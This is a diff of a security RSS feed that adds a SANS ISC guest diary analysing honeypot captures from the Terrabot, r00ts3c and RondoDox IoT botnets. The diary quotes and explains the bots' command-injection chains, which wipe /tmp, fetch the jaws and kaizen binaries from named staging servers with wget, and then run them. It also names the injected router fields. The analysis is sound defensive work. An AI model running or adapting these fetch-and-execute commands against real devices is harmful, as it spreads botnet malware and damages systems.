@@ -1,5 +1,215 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 24 Jun 2026 21:59:25 +0000</lastBuildDate><item><title>DraftKings hacker 'Snoopy' sentenced to 18 months in prison</title><link>https://www.bleepingcomputer.com/news/security/draftkings-hacker-snoopy-sentenced-to-18-months-in-prison/</link><description>A 21-year-old using the alias "Snoopy" was sentenced to 18 months in prison for his role in hacking DraftKings accounts in the November 2022 cyberattack. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/draftkings-hacker-snoopy-sentenced-to-18-months-in-prison/</guid><category>Security</category><category>Legal</category></item><item><title>Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</title><link>https://www.bleepingcomputer.com/news/security/mandiant-reveals-how-cisco-sd-wan-zero-day-attacks-gained-root-access/</link><description>New details have been revealed on how hackers exploited a Cisco Catalyst SD-WAN vulnerability tracked as CVE-2026-20245 in zero-day attacks to create rogue root accounts on targeted devices. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/mandiant-reveals-how-cisco-sd-wan-zero-day-attacks-gained-root-access/</guid><category>Security</category></item><item><title>Malicious Edge extension abuses Native Messaging as bridge to malware</title><link>https://www.bleepingcomputer.com/news/security/malicious-edge-extension-abuses-native-messaging-as-bridge-to-malware/</link><description>A malicious Microsoft Edge extension dubbed 'Edgecution' has been used in a ransomware attack to escape the browser sandbox and deploy a Python-based backdoor. [...]</description><guid isPermaLink="false">https://www.bleepingcomputer.com/news/security/malicious-edge-extension-abuses-native-messaging-as-bridge-to-malware/</guid><category>Security</category></item><item><title>Zoom, Salesforce, Dialpad, and Others Bet Big on Agentic AI for CX</title><link>https://www.techrepublic.com/article/news-agentic-ai-cx-contact-center-ccw/</link><description>&lt;p&gt;CCW showed agentic AI moving deeper into CX platforms. Here’s what IT leaders should know about governance, data, workforce planning, and rollout.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 25 Jun 2026 03:59:19 +0000</lastBuildDate><item><title>What do Ports Hear When Nobody's Listening&amp;#x3f; An Assessment of Automated Cybercrime &amp;#x5b;Guest Diary&amp;#x5d;, (Wed, Jun 24th)</title><link>https://isc.sans.edu/diary/rss/33104</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by Nicole Phillips, an ISC intern as part of the &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;SANS.edu&lt;/a&gt; BACS program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by Nicole Phillips, an ISC intern as part of the &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;SANS.edu&lt;/a&gt; BACS program]&lt;/p&gt;
+
+&lt;p&gt;&amp;quot;&lt;em&gt;I was just sitting here enjoying the company. Plants got a lot to say, if you take the time to listen.&lt;/em&gt;&amp;quot;&lt;br /&gt;
+&amp;mdash; Eeyore, Winnie the Pooh&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Introduction: Listening to the Static&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Setting up and contributing to the DShield honeypot project [&lt;a href="https://isc.sans.edu/honeypot.html"&gt;1&lt;/a&gt;] as an ISC intern is a meaningful part of the BACS program at SANS [2]. Over the last several months I've been thrilled to observe real-time SSH/Telnet activity, check every new file hash and TTY log and hunt for unique http requests. That said, reviewing raw honeypot logs can feel overwhelming. Every day, public facing servers are bombarded by millions of identical hits, mostly automated, creating a fog of noise that seems repetitive, yet disconnected and chaotic. After seeing the same sequence of activity day in and day out, it becomes easy to dismiss traffic as loud background static.&lt;/p&gt;
+
+&lt;p&gt;But like Eeyore's observation of the Hundred Acre Wood, the background noise has a lot to say if you stop to listen. Witnessing the noise helps you understand how to recognize the anomalies. When slowing down and looking more closely at patterns, the fog lifts, revealing layers of orchestration in an automated shadow economy that increasingly drives my curiosity.&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; What are automated botnets and scanners?&lt;br /&gt;
+&amp;bull; How do they operate?&lt;br /&gt;
+&amp;bull; What are they looking for?&lt;br /&gt;
+&amp;bull; What or who operates behind the scenes, and how mature are their engineering tactics?&lt;/p&gt;
+
+&lt;p&gt;While I'm unable to fully answer these questions, I will try to deconstruct some of the malicious automated background noise at several tiers, tracing its trajectory from low-level mechanical slips and overlaps to human-mimicking deception.&lt;/p&gt;
+
+&lt;p&gt;A note on attribution: The assessment that follows references each operation based on its observed &amp;quot;User-Agent&amp;quot; identifier to cluster specific infrastructure and automated behavior; it does not imply definitive attribution of the activity to the original botnet developers.&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;span style="font-size: 16px;"&gt;The Commodity Layer: Surface Noise&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Much of the malicious noise consists of bots and automated scripts scanning blindly for vulnerable IoT devices. These are the weeds of this ecosystem, initially ignored, until one day the entire garden is overrun. In the digital space, this appears as low-level static. It's easy to assume that exploits will reveal themselves out of the static through standard telemetry. I've learned through this internship, however, that malicious activity at this layer is much simpler. Attackers are not knocking down doors; they are walking right through them. Because so much of network defense is inherently reactive, a lot of this activity simply gets missed.&lt;/p&gt;
+
+&lt;p&gt;While the operators exhibit technical limitations and sloppy mistakes, they succeed because they are paying attention. Through automation, mass trial and error campaigns, and volume that outpaces patching and CVEs, these operators can find and weaponize simple gaps that go unnoticed. My web honeypot captured traffic that illustrates this dynamic.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Terrabot: The Disposable Swarm&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;TerraBot is an aggressive IoT botnet variant derived from Mirai and Gafgyt source code frameworks that scans the internet for exploits to weaponize and build its network of compromised devices [&lt;a href="http://https://www.socdefenders.ai/threats/07c347ba-6a9c-44bc-956d-5dde426c673d"&gt;3&lt;/a&gt;]. The User-Agent string, terrabot-owned-you appears repeatedly in my logs. Between May 28 and June 9 my honeypot saw 24 hits from 24 unique IPs, all with the same User-Agent string.&lt;/p&gt;
+
+&lt;p&gt;The vast majority &amp;ndash; 17 of the 24 hits &amp;ndash; targeted the /GponForm/diag_Form?images/ endpoint, while 6 hits delivered a payload targeting a known unauthenticated command injection vulnerability affecting legacy D-Link DSL gateway routers (&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2016-20017"&gt;CVE-2016-20017)&lt;/a&gt; using a staging server at hxxp://140[.]233.190, 47.as shown below:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic1.png" style="width: 720px; height: 179px;" /&gt;&lt;br /&gt;
+Figure 1: Terrabot payload attempting unauthenticated command injection against legacy D-Link DSL routers (&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2016-20017"&gt;CVE-2016-20017&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;Interestingly, Terrabot's automation failures begin with the first hit in my logs, a POST request to /GponForm/diag_Form?images/ attempting to exploit an authentication bypass flaw (&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2018-10561"&gt;CVE-2018-10561&lt;/a&gt;) in Dasan GPON routers.&amp;nbsp; While the logs show the correctly formatted URL string, the exploit requires the POST action to actively inject the malicious payload into the router's ping diagnostic tool via the request body. My logs show each of these hits as entirely empty. This botnet was not performing reconnaissance; it was shooting blanks. Activity against these two endpoints continued over the next 11 days, always from unique IPs.&lt;/p&gt;
+
+&lt;p&gt;Terrabot's campaign ends with a stand-alone event that further confirms its brokenness. On June 9,&amp;nbsp; the following request hit from source IP: &lt;span style="font-family: Courier New,Courier,monospace;"&gt;176.116.165.207&lt;/span&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic2.png" style="width: 720px; height: 87px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;The payload above targets a well-known unauthenticated remote code execution (RCE) backdoor found in legacy MVPower CCTV DVRs, commonly known as the JAWS Webserver RCE (CVE-2016-20016), exploited in the wild between 2017 and 2022. The &amp;quot;JAWS&amp;quot; reference relates to the embedded JAWS web-server and self-identification in HTTP response headers.&lt;/p&gt;
+
+&lt;p&gt;Had the request been correctly formatted, the /shell endpoint would have executed in the device's root terminal as follows:&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; cd /tmp; rm -rf * - &lt;strong&gt;Eviction&lt;/strong&gt;: the bot clears out temporary memory to aggressively wipe out competing malware strains or previous installs&lt;br /&gt;
+&amp;bull; wget+140.233.190.47/jaws - &lt;strong&gt;Staging Endpoint&lt;/strong&gt;: the device reaches out to fetch the jaws binary, hosted on a known malicious endpoint&lt;br /&gt;
+&amp;bull; chmod 777 jaws; sh jaws; ./jaws -&lt;strong&gt; Execution&lt;/strong&gt;: this forces max permissions and attempts to execute the payload simultaneously as both a shell script and compiled binary to ensure successful takeover.&lt;/p&gt;
+
+&lt;p&gt;This exploit failed due to a simple formatting bug. The script author inserted an unencoded, raw space character directly after wget+ instead of standard URL encoding, causing the web server to reject the request. In HTTP protocol formatting, a single blank space acts as a delimiter separating the URI path from the HTTP Version string. Because of this unencoded space, the honeypot immediately rejected the connection with a 400 Bad Request Syntax error, highlighting sloppy, copy-pasted scripting templates that break due to simple human errors.&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic3.png" style="width: 720px; height: 165px;" /&gt;&lt;br /&gt;
+Figure 2: Wireshark stream showing honeypot returning HTTP 400 Bad Request syntax error&lt;/p&gt;
+
+&lt;p&gt;After a short burst of static, this event on June 9, 2026 is the last appearance of Terrabot in my logs. That said, its presence on the /login.cgi?cli=... endpoint marks the spot where it crossed paths with a more structurally sound campaign.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;r00ts3c: The Tactical Shift&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;A second familiar string appears across my logs: r00ts3c-owned-you, and traces back to June 6, 2026, with the first hit from source IP &lt;span style="font-family: Courier New,Courier,monospace;"&gt;124.71.175.215&lt;/span&gt;. Same naming convention as Terrabot, same Mirai lineage, but a different target. This one has a detail buried in the infrastructure that complicates the &amp;quot;commodity&amp;quot; label.&lt;/p&gt;
+
+&lt;p&gt;The activity begins on June 6 with a generic entry point: a direct request to a hardcoded debugging console backdoor shell to the hxxp://&lt;span style="font-family: Courier New,Courier,monospace;"&gt;176[.]65.149.168&lt;/span&gt; staging server to fetch kaizen.arm, a binary specifically targeting ARM processors.&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic4.png" style="width: 720px; height: 172px;" /&gt;&lt;br /&gt;
+Figure 3: Initial r00ts3c entry attempting to fetch and execute the kaizen.arm binary via a debugging console backdoor&lt;/p&gt;
+
+&lt;p&gt;The command string above is broken down as follows:&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; GET /shell? - &lt;strong&gt;Entry&lt;/strong&gt;: The entry point debugging console&lt;br /&gt;
+&amp;bull; cd /tmp; rm -rf * -&lt;strong&gt; Mass Eviction&lt;/strong&gt;: Like Terrabot, this wipes everything. We will see shortly why this is interesting.&lt;br /&gt;
+&amp;bull; wget hxxp://176[.]65.149.168/bins/kaizen.arm - &lt;strong&gt;Staging Endpoint&lt;/strong&gt;: Fetches the kaizen.arm payload from a remote staging server&lt;br /&gt;
+&amp;bull; chmod 777 kaizen.arm; ./kaizen.arm - &lt;strong&gt;Execution&lt;/strong&gt;: Sets execution permissions and runs the binary.&lt;/p&gt;
+
+&lt;p&gt;Two days later on June 8, the activity continues with two POST requests to /UD/?9 and /UD/act?1, which are control endpoints for many consumer routers that use SOAP to communicate over HTTP [&lt;a href="https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/"&gt;4&lt;/a&gt;]. Both requests contain the same staging server as the previous:&lt;/p&gt;
+
+&lt;p&gt;On the same day, the next request hits /tmUnblock.cgi, a CGI endpoint in Linksys E-series routers carrying a critical command injection vulnerability (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2025-34037"&gt;CVE-2025-34037&lt;/a&gt;). While documented since 2013 and historically exploited by&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic5.png" style="width: 720px; height: 176px;" /&gt;&lt;br /&gt;
+Figure 4: r00ts3c targeting SOAP-based /UD router control endpoints using the primary 176.65.149.168 staging server.&lt;/p&gt;
+
+&lt;p&gt;&amp;quot;TheMoon&amp;quot; worm, this vulnerability continues to be actively weaponized by modern botnets [&lt;a href="https://www.sentinelone.com/vulnerability-database/cve-2025-34037/"&gt;8&lt;/a&gt;]. SANS ISC has been tracking the vulnerability since Feb 2014 [&lt;a href="https://isc.sans.edu/diary/17633"&gt;7&lt;/a&gt;], and this specific endpoint since September 2019. The following POST request is from source IP &lt;span style="font-family: Courier New,Courier,monospace;"&gt;119.96.223.148&lt;/span&gt; out of Wuhan, China:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic6.png" style="width: 619px; height: 240px;" /&gt;&lt;br /&gt;
+Figure 5: r00ts3c payload targeting Linksys routers (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2025-34037"&gt;CVE-2025-34037&lt;/a&gt;). Note the hardcoded &lt;span style="font-family: Courier New,Courier,monospace;"&gt;188.166.41.194&lt;/span&gt; DigitalOcean IP in the HTTP Host header.&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic7.png" style="width: 720px; height: 45px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here, the injection occurs in the ttcp_ip field, which is a router diagnostic parameter expecting an IP address for TCP throughput testing. Passing -h gives it an invalid value, causing the utility to fail and triggering the shell to move to the backtick-wrapped command chain:&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; cd /tmp; rm -rf kaizen.mpsl - &lt;strong&gt;Targeted eviction&lt;/strong&gt;: Where Terrabot's final hit ran rm -rf * and wiped everything, this removes only the kaizen binary, leaving other resident malware untouched and reducing noise on the compromised device. Note that on it's first hit, r00ts3c also wiped everything.&lt;br /&gt;
+&amp;bull; wget hxxp://176[.]65.149.168/bins/kaizen.mpsl - &lt;strong&gt;Staging Endpoint&lt;/strong&gt;: Fetches the new kaizen.mpsl payload from a remote staging server&lt;br /&gt;
+&amp;bull; chmod 777 kaizen.mpsl; ./kaizen.mpsl linksys - &lt;strong&gt;Execution&lt;/strong&gt;: Sets execution permissions and runs the binary with &amp;quot;linksys&amp;quot; passed as a runtime argument&lt;/p&gt;
+
+&lt;p&gt;The .mpsl extension identifies a MIPS Little Endian compiled binary, the architecture inside Linksys E-series hardware and a payload built specifically for this target class.&lt;br /&gt;
+Despite this tactical maturity in payload management, a closer look at the raw HTTP headers reveals the same sloppy engineering. In the June 8 request from the Wuhan node shown above, the HTTP Host header reads: &amp;quot;Host&amp;quot;:&amp;quot;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;188.166.41.194&lt;/span&gt;:80&amp;quot;.&lt;/p&gt;
+
+&lt;p&gt;In a properly formatted request, the Host header should reflect the IP address of the destination server (my honeypot IP). Instead, this bot is broadcasting the IP address of a completely unrelated DigitalOcean server.&amp;nbsp; This hard-coding error is a recurring theme here. In other instances with r00ts3c, as well as Terrabot's JAWS attempt, the header is hardcoded as Host: 127.0.0.1:80, the loopback address used for local building and sandbox testing. The operators failed to configure these variables before releasing the bots, demonstrating hastily assembled and structurally flawed delivery systems.&lt;/p&gt;
+
+&lt;p&gt;Wrapping up June 8, we see one final POST request, specifically targeting CVE-2016-20017, coming from source IP 20.210.107.25, with a nearly identical payload as Terrabot's D-Link campaign:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic8.png" style="width: 697px; height: 119px;" /&gt;&lt;br /&gt;
+Figure 6: r00ts3c D-Link exploit attempt (CVE-2016-20017) originating from Microsoft Azure cloud infrastructure.&lt;/p&gt;
+
+&lt;p&gt;The 20.x IP belongs to Microsoft Azure. The geolocation points to an anonymous fallback for cloud infrastructure that cannot be resolved to a specific location (the literal geographic center of the United States).&lt;/p&gt;
+
+&lt;p&gt;For the next 6 days, r00ts3c was silent, picking up again on June 14, from the same &lt;span style="font-family: Courier New,Courier,monospace;"&gt;20.210.107.25&lt;/span&gt; IP, only this time targeting the /tmUnblock.cgi endpoint on port 80. Four more hits followed over the next 24 hours, repeating the /UD endpoints and pointing to the same staging server. On June 17, the bot seemed to loop back to the initial request seen on June 6, only this time from an IP out of Ukraine, pointing to a new staging server: itself, at hxxp://&lt;span style="font-family: Courier New,Courier,monospace;"&gt;83.142.209.46&lt;/span&gt;, also fetching the kaizen.arm binary. The following day, the Azure node strikes again, essentially returning to hit the /shell backdoor one last time. This final request reverted to the original script, attempting to fetch kaizen.arm from the primary staging server at hxxp://&lt;span style="font-family: Courier New,Courier,monospace;"&gt;176.65.149.168&lt;/span&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ultimately, this single Ukraine P2P entry demonstrates that embedded within the background noise are the structural indicators of how the automated botnets adapt, decentralize and survive.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;rondo (aka: RondoDox): The Deep Precursor&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Almost a month before r00ts3c appeared in my logs, a different operator found the perimeter. However, parsing earlier logs revealed that the rondo infrastructure had been silently active since as early as May 2. These logs reveal that the &amp;quot;commodity noise&amp;quot; may often mask highly sophisticated, enterprise-grade attacks.&lt;/p&gt;
+
+&lt;p&gt;This campaign, tracked by the threat intelligence community as the RondoDox botnet[&lt;a href="http://https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis"&gt;5&lt;/a&gt;], unfolded across three distinct phases in my logs.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Phase 1: The Enterprise &amp;amp; AI Shotgun&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Source IP:&amp;nbsp; &lt;span style="font-family: Courier New,Courier,monospace;"&gt;124.198.131.185 | C2: 45.92.1.50&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;The first 8 hits from this campaign originated from source IP 124.198.131.185 (Spark New Zealand). During this first phase, the operator targeted high-value enterprise and AI frameworks, utilizing a primary staging server located at hxxp://&lt;span style="font-family: Courier New,Courier,monospace;"&gt;45[.]92.1.50&lt;/span&gt;.&lt;/p&gt;
+
+&lt;p&gt;These initial hits highlight a more sophisticated execution chain:&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; &lt;strong&gt;Log4Shell WAF Evasion&lt;/strong&gt; (&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228"&gt;CVE-2021-44228&lt;/a&gt;): The attacker utilized environment variable manipulation within the User-Agent string to successfully bypass basic Web Application&lt;/p&gt;
+
+&lt;p&gt;Firewalls. The end of the string contains a Base64 encoded command. Decoding it reveals the fileless execution payload:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic9.png" style="width: 914px; height: 57px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; &lt;strong&gt;The Header Spray&lt;/strong&gt;: Reviewing the JSON logs from the early May events reveals more characteristics of automated broad-spectrum scanning. In addition to dropping the exploit into the&lt;/p&gt;
+
+&lt;p&gt;User-Agent string, rondo maximized probability of success by forcing the obfuscated exploit into every possible HTTP header:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic10.png" style="width: 915px; height: 153px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; &lt;strong&gt;ShadowRay&lt;/strong&gt; (&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2023-48022"&gt;CVE-2023-48022&lt;/a&gt;): Along with the Tomcat attacks, rondo launched targeted hits against the /api/jobs/ endpoint, mimicking standard interactions via python-requests while deploying the fileless loader payload string rondo.wfh.sh directly into memory:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic11.png" style="width: 912px; height: 119px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Phase 2: The Infrastructure Shift&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Source IP:&amp;nbsp; &lt;span style="font-family: Courier New,Courier,monospace;"&gt;124.198.131.185 | C2: 204.10.194.134&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;After the first 8 hits between May 2 and May 3, a clean structural break occurred, and the botnet was silent until May 16, when it resurfaced and fired 5 more hits between May 16 and May 17. While the source IP remained identical, the C2 shifted to a new staging server at hxxp://204[.]10.194.134.&lt;br /&gt;
+rondo also pivoted away from enterprise exploits, firing a succession of command injection attacks at several consumer-grade router interfaces:&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; &lt;strong&gt;LB-LINK Command Injection&lt;/strong&gt; (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26801"&gt;CVE-2023-26801&lt;/a&gt;): Discovered in March 2023 and still active, this vulnerability allows an attacker to execute commands on the device by sending&lt;/p&gt;
+
+&lt;p&gt;crafted HTTP POST requests to the /goform/set_LimitClient_cfg URL. By setting the &amp;quot;time1&amp;quot; and &amp;quot;time2&amp;quot; fields to &amp;quot;00:00-00:00&amp;quot; and injecting arbitrary commands into the &amp;quot;mac&amp;quot; field, an attacker may then execute the command chain on the device.&lt;/p&gt;
+
+&lt;p&gt;&amp;bull;Decoded log payload:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic12.png" style="width: 884px; height: 40px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;bull; &lt;strong&gt;ASUS AsusWRT NVRAM Manipulation&lt;/strong&gt; (&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228"&gt;CVE-2018-6000&lt;/a&gt;):&amp;nbsp; An unauthenticated attacker may enable a hidden background debugging console by submitting a POST request to the /vpnupload.cgi endpoint, allowing arbitrary command execution.&amp;nbsp;&lt;br /&gt;
+&amp;bull; DShield form data payload: name=\&amp;quot;ateCommand_flag\&amp;quot;\r\n\r\n1&lt;/p&gt;
+
+&lt;p&gt;This mid-campaign rotation proves that even commodity botnets possess centralized coordination, updating the configuration of infected edge devices on the fly without needing to re-compromise them.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Phase 3: The Residential Drift&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Source IP: &lt;span style="font-family: Courier New,Courier,monospace;"&gt;124.198.131.22 | C2: 204.10.194.134&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;The final 8 hits of the campaign demonstrate the physical constraints of operating a botnet through consumer hardware. The activity was silent for about 10 days after the last hit on May 17. When it picked back up on May 28, the source IP shifted its last octet to &lt;span style="font-family: Courier New,Courier,monospace;"&gt;124.198.131.22&lt;/span&gt;, reflecting a standard DHCP lease renewal within the same residential IP pool.&lt;/p&gt;
+
+&lt;p&gt;Between May 28 and May 29, 8 hits from this new IP targeted two specific endpoints: the legacy Linksys /tmUnblock.cgi interface and the LB-LINK /goform/set_LimitClient_cfg endpoint, drawing payloads from the secondary &lt;span style="font-family: Courier New,Courier,monospace;"&gt;204.10.194.134&lt;/span&gt; server.&lt;/p&gt;
+
+&lt;p&gt;The target is the same /tmUnblock.cgi endpoint seen with r00ts3c. The query string carries the same base64 value: &lt;span style="font-family: Courier New,Courier,monospace;"&gt;L3RtVW5ibG9jay5jZ2k=&lt;/span&gt;, which decodes to /tmUnblock.cgi, pointing to a shared underlying scanner template.&lt;br /&gt;
+The rondo payload, however, is again fileless:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic13.png" style="width: 976px; height: 41px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;After the IP shift, the timing intervals between the final hits were highly irregular, ranging from two to six hours apart and occurred exclusively during local waking hours in Auckland (NZST, UTC+12).&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic14.png" style="width: 407px; height: 114px;" /&gt;&lt;br /&gt;
+1: RondoDox Phase 3 scanning activity (Source IP: &lt;span style="font-family: Courier New,Courier,monospace;"&gt;124.198.131.22&lt;/span&gt;) correlated with local waking hours in Auckland, New Zealand (NZST).&lt;/p&gt;
+
+&lt;p&gt;All of these hits reflect waking household hours in Auckland, with zero overnight activity. Here, the bandwidth constraints, connectivity interruptions, and activity patterns of a real household bleed into the attack data.&lt;/p&gt;
+
+&lt;p&gt;The device in Auckland is not server infrastructure rondo provisioned. It is a victim, now scanning for more victims exactly like itself. This is the Mirai replication loop in concrete log data: Router gets compromised &amp;rarr; router becomes scanner &amp;rarr; scanner hunts routers &amp;rarr; repeat.&lt;/p&gt;
+
+&lt;p&gt;The botnet is residential infrastructure, not routed through it. The owner of that Auckland router has no idea that their device spent late May probing a Linksys vulnerability between noon and midnight. The irregular scan timing is simply a household schedule leaking through a compromised gateway.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Conclusion: The Depth of the Noise&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Eeyore was right: the background has a lot to say. Across this 30-day observation window, the commodity threat layer showed that it is not monolithic. To dismiss automated scans as simple background static is to overlook a competitive, multi-tiered system running continuously beneath the surface of normal network activity, a shadow economy with its own supply chains, infrastructure patterns, and operational rhythms.&lt;/p&gt;
+
+&lt;p&gt;At the surface, we find campaigns like Terrabot and r00ts3c, scanning for and blasting decades old CVEs with flawed scripts and clumsy engineering. Deeply beneath lies RondoDox, aggressively gathering exploits that target a large range of systems, from consumer-grade hardware to enterprise web-servers and AI frameworks, systematically deploying sophisticated fileless exploit chains while running off of compromised home routers [&lt;a href="https://www.securityweek.com/rondodox-botnet-targeted-174-vulnerabilities/"&gt;6&lt;/a&gt;].&lt;/p&gt;
+
+&lt;p&gt;Threat actors are fundamentally efficient. They do not segment their operations into neat &amp;quot;commodity&amp;quot; or &amp;quot;advanced&amp;quot; categories.&amp;nbsp; They use the exact same disposable infrastructure to scan the entire internet, relying on the persistent gap between what our systems check and what they assume. Ultimately, they don't need sophisticated exploits to inflict damage but weaponize simplicity and high-volume automation that outpaces mitigation.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;For network defenders and analysts, it's important to understand the depth of the noise and how it should be treated. Observing patterns and structural shifts within the static is essential for keeping pace with an automated, multi-directional threat that never stops running. The infrastructure persists, campaigns evolve, payloads update, and the ports keep listening.&lt;/p&gt;
+
+&lt;p&gt;[1] https://isc.sans.edu/honeypot.html&lt;br /&gt;
+[2] https://www.sans.edu/cyber-security-programs/bachelors-degree/&lt;br /&gt;
+[3] https://www.socdefenders.ai/threats/07c347ba-6a9c-44bc-956d-5dde426c673d&lt;br /&gt;
+[4] https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/&lt;br /&gt;
+[5] https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis&lt;br /&gt;
+[6] https://www.securityweek.com/rondodox-botnet-targeted-174-vulnerabilities/&lt;br /&gt;
+[7] https://isc.sans.edu/diary/17633&lt;br /&gt;
+[8] https://www.sentinelone.com/vulnerability-database/cve-2025-34037/&lt;/p&gt;
+
+&lt;p&gt;Disclosure: Gemini supported polish and grammar checks, certain technical explanations, and assistance with locating hard-to-find sources. All such links, source material and commands were independently verified, while all research, event discovery and authorship remain my own.&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;-----------&lt;br /&gt;
+Guy Bruneau &lt;a href="http://www.ipss.ca/"&gt;IPSS Inc.&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://github.com/bruneaug/"&gt;My GitHub Page&lt;/a&gt;&lt;br /&gt;
+Twitter: &lt;a href="https://twitter.com/guybruneau"&gt;GuyBruneau&lt;/a&gt;&lt;br /&gt;
+gbruneau at isc dot sans dot edu&lt;/p&gt;
+
+ 
